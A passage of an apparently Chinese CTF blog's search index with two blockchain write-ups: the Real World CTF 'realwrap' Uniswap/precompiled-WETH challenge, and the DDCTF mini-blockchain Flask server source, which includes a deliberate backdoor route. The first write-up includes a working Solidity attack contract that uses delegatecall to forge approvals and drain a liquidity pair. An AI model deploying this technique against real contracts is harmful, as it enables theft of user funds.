tx1.Hash())\n\n最终这道题也是拿到了第四解\nrealwrap0x01 Intro这道题目使用go仿照着erc20写了一个程序，实现了使用预编译合约直接将ETH作为WrappedETH使用，还是蛮有新意的。\n个人感觉难度比上一道题大一点，但是在比赛中做出这个题目的团队数大概是上一道题目的三倍左右。\n0x02 Code\nClick to see more\npragma solidity ^0.8.17;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"./UniswapV2Pair.sol\";\n\ncontract SimpleToken is ERC20 &#123;\n    constructor(uint256 _initialSupply) ERC20(\"SimpleToken\", \"SPT\") &#123;\n        _mint(msg.sender, _initialSupply);\n    &#125;\n&#125;\n\ninterface IUniswapV2Pair &#123;\n    function getReserves()\n        external\n        view\n        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n\n    function mint(address to) external returns (uint liquidity);\n\n    function initialize(address, address) external;\n&#125;\n\ncontract Factory &#123;\n    address public constant WETH = 0x0000000000000000000000000000000000004eA1;\n    address public uniswapV2Pair;\n\n    event PairCreated(\n        address indexed token0,\n        address indexed token1,\n        address pair\n    );\n\n    constructor() payable &#123;\n        require(msg.value == 1 ether);\n        address token = address(new SimpleToken(10 ** 8 * 1 ether));\n        uniswapV2Pair = createPair(WETH, token);\n        IERC20(WETH).transfer(uniswapV2Pair, 1 ether);\n        IERC20(token).transfer(uniswapV2Pair, 100 ether);\n        IUniswapV2Pair(uniswapV2Pair).mint(msg.sender);\n    &#125;\n\n    function createPair(\n        address tokenA,\n        address tokenB\n    ) public returns (address pair) &#123;\n        (address token0, address token1) = tokenA &lt; tokenB\n            ? (tokenA, tokenB)\n            : (tokenB, tokenA);\n        bytes32 salt = keccak256(abi.encodePacked(token0, token1));\n        pair = address(new UniswapV2Pair&#123;salt: salt&#125;());\n        IUniswapV2Pair(pair).initialize(token0, token1);\n        emit PairCreated(token0, token1, pair);\n    &#125;\n\n    function isSolved() public view returns (bool) &#123;\n        (uint256 reserve0, uint256 reserve1, ) = IUniswapV2Pair(uniswapV2Pair)\n            .getReserves();\n        return reserve0 == 0 &amp;&amp; reserve1 == 0;\n    &#125;\n&#125;\n\n\n\n\n\nClick to see more\npragma solidity ^0.8.17;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/utils/math/Math.sol\";\nimport \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\nimport \"./libraries/UQ112x112.sol\";\n\ninterface IUniswapV2Callee &#123;\n    function uniswapV2Call(\n        address sender,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n&#125;\n\ncontract UniswapV2ERC20 is ERC20 &#123;\n    constructor() ERC20(\"Uniswap V2\", \"UNI-V2\") &#123;&#125;\n&#125;\n\ncontract UniswapV2Pair is UniswapV2ERC20 &#123;\n    using SafeMath for uint256;\n    using UQ112x112 for uint224;\n    using SafeERC20 for IERC20;\n    uint256 public constant MINIMUM_LIQUIDITY = 10 ** 3;\n\n    address public factory;\n    address public token0;\n    address public token1;\n\n    uint112 private reserve0; // uses single storage slot, accessible via getReserves\n    uint112 private reserve1; // uses single storage slot, accessible via getReserves\n    uint32 private blockTimestampLast; // uses single storage slot, accessible via getReserves\n\n    uint256 public price0CumulativeLast;\n    uint256 public price1CumulativeLast;\n\n    uint256 private unlocked = 1;\n    modifier lock() &#123;\n        require(unlocked == 1, \"UniswapV2: LOCKED\");\n        unlocked = 0;\n        _;\n        unlocked = 1;\n    &#125;\n\n    function getReserves()\n        public\n        view\n        returns (\n            uint112 _reserve0,\n            uint112 _reserve1,\n            uint32 _blockTimestampLast\n        )\n    &#123;\n        _reserve0 = reserve0;\n        _reserve1 = reserve1;\n        _blockTimestampLast = blockTimestampLast;\n    &#125;\n\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n    event Burn(\n        address indexed sender,\n        uint256 amount0,\n        uint256 amount1,\n        address indexed to\n    );\n    event Swap(\n        address indexed sender,\n        uint256 amount0In,\n        uint256 amount1In,\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    constructor() &#123;\n        factory = msg.sender;\n    &#125;\n\n    // called once by the factory at time of deployment\n    function initialize(address _token0, address _token1) external &#123;\n        require(msg.sender == factory, \"UniswapV2: FORBIDDEN\"); // sufficient check\n        token0 = _token0;\n        token1 = _token1;\n    &#125;\n\n    // update reserves and, on the first call per block, price accumulators\n    function _update(\n        uint256 balance0,\n        uint256 balance1,\n        uint112 _reserve0,\n        uint112 _reserve1\n    ) private &#123;\n        require(\n            balance0 &lt;= type(uint112).max &amp;&amp; balance1 &lt;= type(uint112).max,\n            \"UniswapV2: OVERFLOW\"\n        );\n        uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);\n        unchecked &#123;\n            uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n            if (timeElapsed > 0 &amp;&amp; _reserve0 != 0 &amp;&amp; _reserve1 != 0) &#123;\n                // * never overflows, and + overflow is desired\n                price0CumulativeLast +=\n                    uint256(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *\n                    timeElapsed;\n                price1CumulativeLast +=\n                    uint256(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *\n                    timeElapsed;\n            &#125;\n        &#125;\n        reserve0 = uint112(balance0);\n        reserve1 = uint112(balance1);\n        blockTimestampLast = blockTimestamp;\n        emit Sync(reserve0, reserve1);\n    &#125;\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function mint(address to) external lock returns (uint256 liquidity) &#123;\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves();\n        uint256 balance0 = IERC20(token0).balanceOf(address(this));\n        uint256 balance1 = IERC20(token1).balanceOf(address(this));\n        uint256 amount0 = balance0.sub(_reserve0);\n        uint256 amount1 = balance1.sub(_reserve1);\n\n        uint256 _totalSupply = totalSupply();\n        if (_totalSupply == 0) &#123;\n            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n            _mint(address(0xdEaD), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n        &#125; else &#123;\n            liquidity = Math.min(\n                amount0.mul(_totalSupply) / _reserve0,\n                amount1.mul(_totalSupply) / _reserve1\n            );\n        &#125;\n        require(liquidity > 0, \"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\");\n        _mint(to, liquidity);\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Mint(msg.sender, amount0, amount1);\n    &#125;\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function burn(\n        address to\n    ) external lock returns (uint256 amount0, uint256 amount1) &#123;\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves();\n        address _token0 = token0;\n        address _token1 = token1;\n        uint256 balance0 = IERC20(_token0).balanceOf(address(this));\n        uint256 balance1 = IERC20(_token1).balanceOf(address(this));\n        uint256 liquidity = balanceOf(address(this));\n\n        uint256 _totalSupply = totalSupply();\n        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\n        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\n        require(\n            amount0 > 0 &amp;&amp; amount1 > 0,\n            \"UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED\"\n        );\n        _burn(address(this), liquidity);\n        IERC20(token0).safeTransfer(to, amount0);\n        IERC20(token1).safeTransfer(to, amount1);\n\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Burn(msg.sender, amount0, amount1, to);\n    &#125;\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes calldata data\n    ) external lock &#123;\n        require(\n            amount0Out > 0 || amount1Out > 0,\n            \"UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT\"\n        );\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves();\n        require(\n            amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1,\n            \"UniswapV2: INSUFFICIENT_LIQUIDITY\"\n        );\n\n        uint256 balance0;\n        uint256 balance1;\n        &#123;\n            // scope for _token&#123;0,1&#125;, avoids stack too deep errors\n            address _token0 = token0;\n            address _token1 = token1;\n            require(to != _token0 &amp;&amp; to != _token1, \"UniswapV2: INVALID_TO\");\n            if (amount0Out > 0) IERC20(_token0).safeTransfer(to, amount0Out);\n            if (amount1Out > 0) IERC20(_token1).safeTransfer(to, amount1Out);\n            if (data.length > 0)\n                IUniswapV2Callee(to).uniswapV2Call(\n                    msg.sender,\n                    amount0Out,\n                    amount1Out,\n                    data\n                );\n            balance0 = IERC20(_token0).balanceOf(address(this));\n            balance1 = IERC20(_token1).balanceOf(address(this));\n        &#125;\n        uint256 amount0In = balance0 > _reserve0 - amount0Out\n            ? balance0 - (_reserve0 - amount0Out)\n            : 0;\n        uint256 amount1In = balance1 > _reserve1 - amount1Out\n            ? balance1 - (_reserve1 - amount1Out)\n            : 0;\n        require(\n            amount0In > 0 || amount1In > 0,\n            \"UniswapV2: INSUFFICIENT_INPUT_AMOUNT\"\n        );\n        &#123;\n            // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors\n            uint256 balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));\n            uint256 balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));\n            require(\n                balance0Adjusted.mul(balance1Adjusted) >=\n                    uint256(_reserve0).mul(_reserve1).mul(1000 ** 2),\n                \"UniswapV2: K\"\n            );\n        &#125;\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    &#125;\n\n    // force balances to match reserves\n    function skim(address to) external lock &#123;\n        address _token0 = token0;\n        address _token1 = token1;\n        IERC20(_token0).safeTransfer(\n            to,\n            IERC20(_token0).balanceOf(address(this)) - reserve0\n        );\n        IERC20(_token1).safeTransfer(\n            to,\n            IERC20(_token1).balanceOf(address(this)) - reserve1\n        );\n    &#125;\n\n    // force reserves to match balances\n    function sync() external lock &#123;\n        _update(\n            IERC20(token0).balanceOf(address(this)),\n            IERC20(token1).balanceOf(address(this)),\n            reserve0,\n            reserve1\n        );\n    &#125;\n&#125;\n\n\n\n\n0x03 Analyse清空Pair合约reserve即获胜\n使用Golang实现了预编译合约，先来简单分析一下Go代码\n篇幅有些长，直接上关键部分wrap.go\nfunc transferAndCall(evm *vm.EVM, caller common.Address, input []byte, suppliedGas uint64, readOnly bool) (ret []byte, remainingGas uint64, err error) &#123;\n\tif readOnly &#123;\n\t\treturn nil, suppliedGas, ErrWriteProtection\n\t&#125;\n\tinputArgs := &amp;TransferAndCallInput&#123;&#125;\n\tif err = unpackInputIntoInterface(inputArgs, \"transferAndCall\", input); err != nil &#123;\n\t\treturn nil, suppliedGas, err\n\t&#125;\n\n\tif ret, remainingGas, err = transferInternal(evm, suppliedGas, caller, inputArgs.To, inputArgs.Amount); err != nil &#123;\n\t\treturn ret, remainingGas, err\n\t&#125;\n\n\tcode := evm.StateDB.GetCode(inputArgs.To)\n\tif len(code) == 0 &#123;\n\t\treturn ret, remainingGas, nil\n\t&#125;\n\n\tsnapshot := evm.StateDB.Snapshot()\n\tevm.depth\n\tdefer func() &#123; evm.depth-- &#125;()\n\n\tif ret, remainingGas, err = evm.Call(vm.AccountRef(caller), inputArgs.To, inputArgs.Data, remainingGas, common.Big0); err != nil &#123;\n\t\tevm.StateDB.RevertToSnapshot(snapshot)\n\t\tif err != ErrExecutionReverted &#123;\n\t\t\tremainingGas = 0\n\t\t&#125;\n\t&#125;\n\n\treturn ret, remainingGas, err\n&#125;\n\nWETH ABI：\n&#123; map[\n  allowance:function allowance(address owner, address spender) view returns(uint256) approve:function approve(address spender, uint256 amount) returns(bool)\nbalanceOf:function balanceOf(address account) view returns(uint256) \ntransfer:function transfer(address to, uint256 amount) returns(bool) \ntransferAndCall:function transferAndCall(address to, uint256 amount, bytes data) returns(bool) transferFrom:function transferFrom(address from, address to, uint256 amount) returns(bool)] map[] map[]  &#125;\n\n与常规ERC20不同，还实现了一个transferAndCall功能，顾名思义就是在转账的同时进行特定数据（data）的执行\n在wrap.go中简单看一下可以发现evm.Call(vm.AccountRef(caller), inputArgs.To, inputArgs.Data, remainingGas, common.Big0)该语句中使用的caller就是调用者的地址拆分开来就是A trnsfer to B和A call data to B，这样来看的话我们如果让Pair合约能够主动的调用ETH和Token中的approve我们就可以实现清空Pair合约的余额\n在swap函数中具有外部调用的功能，所以我们可以通过触发外部调用实现我们的目的，但是在外部调用之中调用weth的话的caller是攻击合约地址，关键之处就是在于构造caller为Pair合约地址\n想到了delegatecall，将weth中的逻辑内容搬到外部调用的恶意函数中去，这是caller地址成功构造为Pair地址\n有了这个思路我们构造出攻击合约进行漏洞利用即可\n0x04 Attackinterface WETH&#123;\n    function balanceOf(address account)external view returns(uint256) ;\n    function transfer(address to, uint256 amount)external returns(bool);\n    function transferAndCall(address to, uint256 amount, bytes calldata data)external  returns(bool);\n    function transferFrom(address from, address to, uint256 amount)external returns(bool);\n    function approve(address spender, uint256 amount)external returns(bool);\n    function allowance(address owner, address spender)external view returns(uint256);\n\n&#125;\n\ncontract attack&#123;\n    WETH public weth = WETH(0x0000000000000000000000000000000000004eA1);\n    IERC20 public erc20;\n    UniswapV2Pair public pair;\n    // address _a,address _pair\n    constructor()payable&#123;\n         erc20 = IERC20(0x82431c780e4204d42BF1b19AD964CD2fe715F2FD);\n         pair = UniswapV2Pair(0x651357d314662b28C3Db9A9902502633203CD06F);\n    &#125;\n\n    function step() public &#123;\n         pair.swap(1, 0, address(this), \"0xdata\");\n    &#125;\n\n    function uniswapV2Call(address a,uint b,uint c,bytes calldata d)public&#123;\n        // (bool success,)=address(weth).delegatecall(abi.encodeWithSignature(\"transferAndCall(address,uint256,bytes)\", address(weth),1,abi.encodeWithSignature(\"approve(address,uint256)\", address(this),(uint)(int(-2)))));\n        //注释部分不可取，wrap.go中判断目标地址是否存在code，不存在将不会调用，实际上weth只是一个预编译合约，并不是一个真正存在在以太坊上的合约。\n        (bool success,)=address(weth).delegatecall(abi.encodeWithSignature(\"approve(address,uint256)\",address(this),(uint)(int(-1))));\n        require(success,\"fail\");\n        address(weth).delegatecall(abi.encodeWithSignature(\"transferAndCall(address,uint256,bytes)\", address(erc20),1,abi.encodeWithSignature(\"approve(address,uint256)\", address(this),(uint)(int(-1)))));\n        weth.transfer(address(pair),100);\n    &#125;\n    function ok()public &#123;\n        weth.transferFrom(address(pair),address(this),weth.balanceOf(address(pair)));\n        erc20.transferFrom(address(pair), address(this), erc20.balanceOf(address(pair)));\n        pair.sync();\n    &#125;\n    receive()external payable&#123;&#125;\n&#125;\n\n最终这道题只拿到了第十七解\nSum up总结一下，RWCTF的题目感觉还是蛮有质量的，虽然实现了区块链方向的全解但是依旧觉得有些吃力，技术能力还有待提高。\n","slug":"real-world-ctf-HappyFactory","date":"2023-01-07T18:35:13.555Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"ab8ce4952a43550ec79920bab8adbb0a","title":"Preliminary Exploration of Public Chain Security","content":"0x01 challenge\n\ndocker run -it -p 5000:5000 chainflag&#x2F;mini_blockchain\n&#x2F;&#x2F;运行题目\n\n0x02 source codeServe.py# -*- encoding: utf-8 -*-\n# written in python 2.7\n__author__ = 'garzon'\n\nimport hashlib, json, rsa, uuid, os\nfrom flask import Flask, session, redirect, url_for, escape, request\n\napp = Flask(__name__)\napp.secret_key = '*********************'\nurl_prefix = '/b9ca5f959dd7e'\n\ndef FLAG():\n    return 'Here is your flag: DDCTF&#123;******************&#125;'\n\ndef hash(x):\n    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()\n    \ndef hash_reducer(x, y):\n    return hash(hash(x)+hash(y))\n    \ndef has_attrs(d, attrs):\n    if type(d) != type(&#123;&#125;): raise Exception(\"Input should be a dict/JSON\")\n    for attr in attrs:\n        if attr not in d:\n            raise Exception(\"&#123;&#125; should be presented in the input\".format(attr))\n\nEMPTY_HASH = '0'*64\n\ndef addr_to_pubkey(address):\n    return rsa.PublicKey(int(address, 16), 65537)\n    \ndef pubkey_to_address(pubkey):\n    assert pubkey.e == 65537\n    hexed = hex(pubkey.n)\n    if hexed.endswith('L'): hexed = hexed[:-1]\n    if hexed.startswith('0x'): hexed = hexed[2:]\n    return hexed\n    \ndef gen_addr_key_pair():\n    pubkey, privkey = rsa.newkeys(384)\n    return pubkey_to_address(pubkey), privkey\n\nbank_address, bank_privkey = gen_addr_key_pair()\nhacker_address, hacker_privkey = gen_addr_key_pair()\nshop_address, shop_privkey = gen_addr_key_pair()\nshop_wallet_address, shop_wallet_privkey = gen_addr_key_pair()\n\ndef sign_input_utxo(input_utxo_id, privkey):\n    return rsa.sign(input_utxo_id, privkey, 'SHA-1').encode('hex')\n    \ndef hash_utxo(utxo):\n    return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])\n    \ndef create_output_utxo(addr_to, amount):\n    utxo = &#123;'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount&#125;\n    utxo['hash'] = hash_utxo(utxo)\n    return utxo\n    \ndef hash_tx(tx):\n    return reduce(hash_reducer, [\n        reduce(hash_reducer, tx['input'], EMPTY_HASH),\n        reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH)\n    ])\n    \ndef create_tx(input_utxo_ids, output_utxo, privkey_from=None):\n    tx = &#123;'input': input_utxo_ids, 'signature': [sign_input_utxo(id, privkey_from) for id in input_utxo_ids], 'output': output_utxo&#125;\n    tx['hash'] = hash_tx(tx)\n    return tx\n    \ndef hash_block(block):\n    return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])\n    \ndef create_block(prev_block_hash, nonce_str, transactions):\n    if type(prev_block_hash) != type(''): raise Exception('prev_block_hash should be hex-encoded hash value')\n    nonce = str(nonce_str)\n    if len(nonce) > 128: raise Exception('the nonce is too long')\n    block = &#123;'prev': prev_block_hash, 'nonce': nonce, 'transactions': transactions&#125;\n    block['hash'] = hash_block(block)\n    return block\n    \ndef find_blockchain_tail():\n    return max(session['blocks'].values(), key=lambda block: block['height'])\n    \ndef calculate_utxo(blockchain_tail):\n    curr_block = blockchain_tail\n    blockchain = [curr_block]\n    while curr_block['hash'] != session['genesis_block_hash']:\n        curr_block = session['blocks'][curr_block['prev']]\n        blockchain.append(curr_block)\n    blockchain = blockchain[::-1]\n    utxos = &#123;&#125;\n    for block in blockchain:\n        for tx in block['transactions']:\n            for input_utxo_id in tx['input']:\n                del utxos[input_utxo_id]\n            for utxo in tx['output']:\n                utxos[utxo['id']] = utxo\n    return utxos\n        \ndef calculate_balance(utxos):\n    balance = &#123;bank_address: 0, hacker_address: 0, shop_address: 0&#125;\n    for utxo in utxos.values():\n        if utxo['addr'] not in balance:\n            balance[utxo['addr']] = 0\n        balance[utxo['addr']] += utxo['amount']\n    return balance\n\ndef verify_utxo_signature(address, utxo_id, signature):\n    try:\n        return rsa.verify(utxo_id, signature.decode('hex'), addr_to_pubkey(address))\n    except:\n        return False\n\ndef append_block(block, difficulty=int('f'*64, 16)):\n    has_attrs(block, ['prev', 'nonce', 'transactions'])\n    \n    if type(block['prev']) == type(u''): block['prev'] = str(block['prev'])\n    if type(block['nonce']) == type(u''): block['nonce'] = str(block['nonce'])\n    if block['prev'] not in session['blocks']: raise Exception(\"unknown parent block\")\n    tail = session['blocks'][block['prev']]\n    utxos = calculate_utxo(tail)\n    \n    if type(block['transactions']) != type([]): raise Exception('Please put a transaction array in the block')\n    new_utxo_ids = set()\n    for tx in block['transactions']:\n        has_attrs(tx, ['input', 'output', 'signature'])\n        \n        for utxo in tx['output']:\n            has_attrs(utxo, ['amount', 'addr', 'id'])\n            if type(utxo['id']) == type(u''): utxo['id'] = str(utxo['id'])\n            if type(utxo['addr']) == type(u''): utxo['addr'] = str(utxo['addr'])\n            if type(utxo['id']) != type(''): raise Exception(\"unknown type of id of output utxo\")\n            if utxo['id'] in new_utxo_ids: raise Exception(\"output utxo of same id(&#123;&#125;) already exists.\".format(utxo['id']))\n            new_utxo_ids.add(utxo['id'])\n            if type(utxo['amount']) != type(1): raise Exception(\"unknown type of amount of output utxo\")\n            if utxo['amount'] &lt;= 0: raise Exception(\"invalid amount of output utxo\")\n            if type(utxo['addr']) != type(''): raise Exception(\"unknown type of address of output utxo\")\n            try:\n                addr_to_pubkey(utxo['addr'])\n            except:\n                raise Exception(\"invalid type of address(&#123;&#125;)\".format(utxo['addr']))\n            utxo['hash'] = hash_utxo(utxo)\n        tot_output = sum([utxo['amount'] for utxo in tx['output']])\n        \n        if type(tx['input']) != type([]): raise Exception(\"type of input utxo ids in tx should be array\")\n        if type(tx['signature']) != type([]): raise Exception(\"type of input utxo signatures in tx should be array\")\n        if len(tx['input']) != len(tx['signature']): raise Exception(\"lengths of arrays of ids and signatures of input utxos should be the same\")\n        tot_input = 0\n        tx['input'] = [str(i) if type(i) == type(u'') else i for i in tx['input']]\n        tx['signature'] = [str(i) if type(i) == type(u'') else i for i in tx['signature']]\n        for utxo_id, signature in zip(tx['input'], tx['signature']):\n            if type(utxo_id) != type(''): raise Exception(\"unknown type of id of input utxo\")\n            if utxo_id not in utxos: raise Exception(\"invalid id of input utxo. Input utxo(&#123;&#125;) does not exist or it has been consumed.\".format(utxo_id))\n            utxo = utxos[utxo_id]\n            if type(signature) != type(''): raise Exception(\"unknown type of signature of input utxo\")\n            if not verify_utxo_signature(utxo['addr'], utxo_id, signature):\n                raise Exception(\"Signature of input utxo is not valid. You are not the owner of this input utxo(&#123;&#125;)!\".format(utxo_id))\n            tot_input += utxo['amount']\n            del utxos[utxo_id]\n        if tot_output > tot_input:\n            raise Exception(\"You don't have enough amount of DDCoins in the input utxo! &#123;&#125;/&#123;&#125;\".format(tot_input, tot_output))\n        tx['hash'] = hash_tx(tx)\n    \n    block = create_block(block['prev'], block['nonce'], block['transactions'])\n    block_hash = int(block['hash'], 16)\n    if block_hash > difficulty: raise Exception('Please provide a valid Proof-of-Work')\n    block['height'] = tail['height']+1\n    if len(session['blocks']) > 50: raise Exception('The blockchain is too long. Use ./reset to reset the blockchain')\n    if block['hash'] in session['blocks']: raise Exception('A same block is already in the blockchain')\n    session['blocks'][block['hash']] = block\n    session.modified = True\n    \ndef init():\n    if 'blocks' not in session:\n        session['blocks'] = &#123;&#125;\n        session['your_diamonds'] = 0\n    \n        # First, the bank issued some DDCoins ...\n        total_currency_issued = create_output_utxo(bank_address, 1000000)\n        genesis_transaction = create_tx([], [total_currency_issued]) # create DDCoins from nothing\n        genesis_block = create_block(EMPTY_HASH, 'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank', [genesis_transaction])\n        session['genesis_block_hash'] = genesis_block['hash']\n        genesis_block['height'] = 0\n        session['blocks'][genesis_block['hash']] = genesis_block\n        \n        # Then, the bank was hacked by the hacker ...\n        handout = create_output_utxo(hacker_address, 999999)\n        reserved = create_output_utxo(bank_address, 1)\n        transferred = create_tx([total_currency_issued['id']], [handout, reserved], bank_privkey)\n        second_block = create_block(genesis_block['hash'], 'HAHA, I AM THE BANK NOW!', [transferred])\n        append_block(second_block)\n        \n        # Can you buy 2 diamonds using all DDCoins?\n        third_block = create_block(second_block['hash'], 'a empty block', [])\n        append_block(third_block)\n        \ndef get_balance_of_all():\n    init()\n    tail = find_blockchain_tail()\n    utxos = calculate_utxo(tail)\n    return calculate_balance(utxos), utxos, tail\n    \n@app.route(url_prefix+'/')\ndef homepage():\n    announcement = 'Announcement: The server has been restarted at 21:45 04/17. All blockchain have been reset. '\n    balance, utxos, _ = get_balance_of_all()\n    genesis_block_info = 'hash of genesis block: ' + session['genesis_block_hash']\n    addr_info = 'the bank\\'s addr: ' + bank_address + ', the hacker\\'s addr: ' + hacker_address + ', the shop\\'s addr: ' + shop_address\n    balance_info = 'Balance of all addresses: ' + json.dumps(balance)\n    utxo_info = 'All utxos: ' + json.dumps(utxos)\n    blockchain_info = 'Blockchain Explorer: ' + json.dumps(session['blocks'])\n    view_source_code_link = \"&lt;a href='source_code'>View source code&lt;/a>\"\n    return announcement+('&lt;br />&lt;br />\\r\\n\\r\\n'.join([view_source_code_link, genesis_block_info, addr_info, balance_info, utxo_info, blockchain_info]))\n    \n    \n@app.route(url_prefix+'/flag')\ndef getFlag():\n    init()\n    if session['your_diamonds'] >= 2: return FLAG()\n    return 'To get the flag, you should buy 2 diamonds from the shop. You have &#123;&#125; diamonds now. To buy a diamond, transfer 1000000 DDCoins to '.format(session['your_diamonds']) + shop_address\n    \ndef find_enough_utxos(utxos, addr_from, amount):\n    collected = []\n    for utxo in utxos.values():\n        if utxo['addr'] == addr_from:\n            amount -= utxo['amount']\n            collected.append(utxo['id'])\n        if amount &lt;= 0: return collected, -amount\n    raise Exception('no enough DDCoins in ' + addr_from)\n    \ndef transfer(utxos, addr_from, addr_to, amount, privkey):\n    input_utxo_ids, the_change = find_enough_utxos(utxos, addr_from, amount)\n    outputs = [create_output_utxo(addr_to, amount)]\n    if the_change != 0:\n        outputs.append(create_output_utxo(addr_from, the_change))\n    return create_tx(input_utxo_ids, outputs, privkey)\n    \n@app.route(url_prefix+'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address>')\ndef free_ddcoin(address):\n    balance, utxos, tail = get_balance_of_all()\n    if balance[bank_address] == 0: return 'The bank has no money now.'\n    try:\n        address = str(address)\n        addr_to_pubkey(address) # to check if it is a valid address\n        transferred = transfer(utxos, bank_address, address, balance[bank_address], bank_privkey)\n        new_block = create_block(tail['hash'], 'b@cKd00R tr1993ReD', [transferred])\n        append_block(new_block)\n        return str(balance[bank_address]) + ' DDCoins are successfully sent to ' + address\n    except Exception,e:\n        return 'ERROR: ' + str(e)\n\nDIFFICULTY = int('00000' + 'f' * 59, 16)\n@app.route(url_prefix+'/create_transaction', methods=['POST'])\ndef create_tx_and_check_shop_balance():\n    init()\n    try:\n        block = json.loads(request.data)\n        append_block(block, DIFFICULTY)\n        msg = 'transaction finished.'\n    except Exception, e:\n        return str(e)\n        \n    balance, utxos, tail = get_balance_of_all()\n    if balance[shop_address] == 1000000:\n        # when 1000000 DDCoins are received, the shop will give you a diamond\n        session['your_diamonds'] += 1\n        # and immediately the shop will store the money somewhere safe.\n        transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey)\n        new_block = create_block(tail['hash'], 'save the DDCoins in a cold wallet', [transferred])\n        append_block(new_block)\n        msg += ' You receive a diamond.'\n    return msg\n    \n        \n# if you mess up the blockchain, use this to reset the blockchain.\n@app.route(url_prefix+'/reset')\ndef reset_blockchain():\n    if 'blocks' in session: del session['blocks']\n    if 'genesis_block_hash' in session: del session['genesis_block_hash']\n    return 'reset.'\n    \n@app.route(url_prefix+'/source_code')\ndef show_source_code():\n    source = open('serve.py', 'r')\n    html = ''\n    for line in source:\n        html += line.replace('&amp;','&amp;amp;').replace('\\t', '&amp;nbsp;'*4).replace(' ','&amp;nbsp;').replace('&lt;', '&amp;lt;').replace('>','&amp;gt;').replace('\\n', '&lt;br />')\n    source.close()\n    return html\n    \nif __name__ == '__main__':\n    app.run(debug=False, host='0.0.0.0')\n\nBlock.jsonAnnouncement: The server has been restarted at 21: 45 04/17. All blockchain have been reset. View source code\n\nhash of genesis block: be640671a52952b2131db45c57d47546981ff5f147be0bbd635a3ddc84223875\n\nthe bank's addr: 82f4388efc72da6dc0b3f2de97f71b08f75d884c84a13fe65c4e8fab520c9f28ca88541f96180a0740490ac4785091a1,\nthe hacker's addr: abf5835cbc5365bbcca88fd5b42d206da37819e55c9a8f82483b691b81994c9013d9d5972cd7a65a0a96bcf6f070858b, \nthe shop's addr: 89bd78fab0d0340fa22af91cd104a07d4725f8b0296e49abe939fed47b12940b5f2c1a70e22a5a8d38c119916b8cd545\n\nBalance of all addresses: &#123;\n    \"89bd78fab0d0340fa22af91cd104a07d4725f8b0296e49abe939fed47b12940b5f2c1a70e22a5a8d38c119916b8cd545\": 0,\n    \"abf5835cbc5365bbcca88fd5b42d206da37819e55c9a8f82483b691b81994c9013d9d5972cd7a65a0a96bcf6f070858b\": 999999,\n    \"82f4388efc72da6dc0b3f2de97f71b08f75d884c84a13fe65c4e8fab520c9f28ca88541f96180a0740490ac4785091a1\": 1\n&#125;\n\nAll utxos: &#123;\n    \"0ff9dfa0-a54a-4178-bfec-08ffe5b8b563\": &#123;\n        \"amount\": 1,\n        \"hash\": \"7214dfcf889839edcc6f62a45a5dc7f6facee8d07770076a47066cfa31284e56\",\n        \"addr\": \"82f4388efc72da6dc0b3f2de97f71b08f75d884c84a13fe65c4e8fab520c9f28ca88541f96180a0740490ac4785091a1\",\n        \"id\": \"0ff9dfa0-a54a-4178-bfec-08ffe5b8b563\"\n    &#125;,\n    \"7637e88e-f204-4218-a06f-e9d7bac7c83f\": &#123;\n        \"amount\": 999999,\n        \"hash\": \"812d25d4353dbd4fe577f95bd0e2b9c025e869fda429bafaef29e905ab057b21\",\n        \"addr\": \"abf5835cbc5365bbcca88fd5b42d206da37819e55c9a8f82483b691b81994c9013d9d5972cd7a65a0a96bcf6f070858b\",\n        \"id\": \"7637e88e-f204-4218-a06f-e9d7bac7c83f\"\n    &#125;\n&#125;\n\nBlockchain Explorer: &#123;\n    